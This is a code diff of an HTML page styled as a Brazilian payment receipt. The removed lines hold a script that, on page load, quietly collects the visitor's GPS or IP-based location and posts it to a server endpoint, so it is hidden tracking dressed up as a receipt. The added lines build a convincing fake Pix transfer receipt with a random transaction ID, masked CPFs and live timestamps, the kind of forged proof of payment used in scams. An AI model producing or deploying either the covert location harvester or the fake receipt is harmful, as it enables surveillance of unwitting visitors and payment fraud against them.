@@ -1,25 +1,31 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
+  <title>Pix Enviado - R$ 1.000,00</title>
+  <link rel="stylesheet" href="styles.css">
 </head>
-
 <body>
   <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
+    <h1>Pix Enviado - <strong>R$ 1.000,00</strong></h1>
 
     <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+      <p><span>Data do Pagamento:</span> <span id="data-pagamento"></span></p>
+      <p><span>Horário:</span> <span id="horario-atual"></span></p>
+      <p><span>ID da Transação:</span> <strong id="id-transacao"></strong></p>
+      <hr class="linha-pontilhada">
+      <p><span>Quem Recebeu:</span> <strong>João Silva de Oliveira</strong></p>
+      <p><span>CPF:</span> <strong id="cpf-recebeu"></strong></p>
+      <p><span>Instituição:</span> <strong>Banco Digital XYZ</strong></p>
+      <p><span>Chave Pix:</span> <strong>joaosilva@email.com</strong></p>
+      <hr class="linha-pontilhada"> <!-- Agora abaixo da Chave Pix -->
+      <p><span>Quem Pagou:</span> <strong>Maria Fernanda Costa</strong></p>
+      <p><span>CPF:</span> <strong id="cpf-pagou"></strong></p>
+      <p><span>Instituição:</span> <strong>Banco Digital ABC</strong></p>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
 
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
@@ -28,66 +34,49 @@
   </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => sendLocation(position, "Precisa (GPS)"),
-          () => fallbackLocation()
-        );
-      } else {
-        fallbackLocation();
+    // Atualiza a data do pagamento com o dia da semana
+    function atualizarDataPagamento() {
+      const dataAtual = new Date();
+      const diasSemana = ["Domingo", "Segunda-feira", "Terça-feira", "Quarta-feira", "Quinta-feira", "Sexta-feira", "Sábado"];
+      
+      const diaSemana = diasSemana[dataAtual.getDay()];
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      document.getElementById("data-pagamento").textContent = `${diaSemana}, ${dia}/${mes}/${ano}`;
+    }
+
+    // Atualiza o horário apenas uma vez
+    function atualizarHorario() {
+      const dataAtual = new Date();
+      const horas = String(dataAtual.getHours()).padStart(2, '0');
+      const minutos = String(dataAtual.getMinutes()).padStart(2, '0');
+      document.getElementById("horario-atual").textContent = `${horas}:${minutos}`;
+    }
+
+    // Gera um ID da transação com 32 caracteres
+    function gerarIdTransacao() {
+      const caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      let id = "PIX";
+      for (let i = 0; i < 29; i++) {
+        id += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
       }
-    });
-
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    function sendLocation(position, source) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      enviarParaApi(latitude, longitude, maps, source);
+      document.getElementById("id-transacao").textContent = id;
     }
 
-    function fallbackLocation() {
-      fetch("https://ipapi.co/json/")
-        .then(response => response.json())
-        .then(data => {
-          const latitude = data.latitude;
-          const longitude = data.longitude;
-          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-          enviarParaApi(latitude, longitude, maps, "Aproximada (IP)");
-        })
-        .catch(error => {
-          console.error("Erro ao obter localização pelo IP:", error);
-        });
+    // Formata os CPFs com asteriscos
+    function formatarCPF(cpf) {
+      return `***.${cpf.substring(4, 7)}.${cpf.substring(7, 10)}-**`;
     }
 
-    function enviarParaApi(latitude, longitude, maps, source) {
-      fetch("/api/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps, source })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
+    // Define os CPFs formatados
+    document.getElementById("cpf-recebeu").textContent = formatarCPF("12345678900");
+    document.getElementById("cpf-pagou").textContent = formatarCPF("98765432100");
+
+    // Executa as funções ao carregar a página
+    atualizarDataPagamento();
+    atualizarHorario();
+    gerarIdTransacao();
   </script>
 </body>
-
 </html>
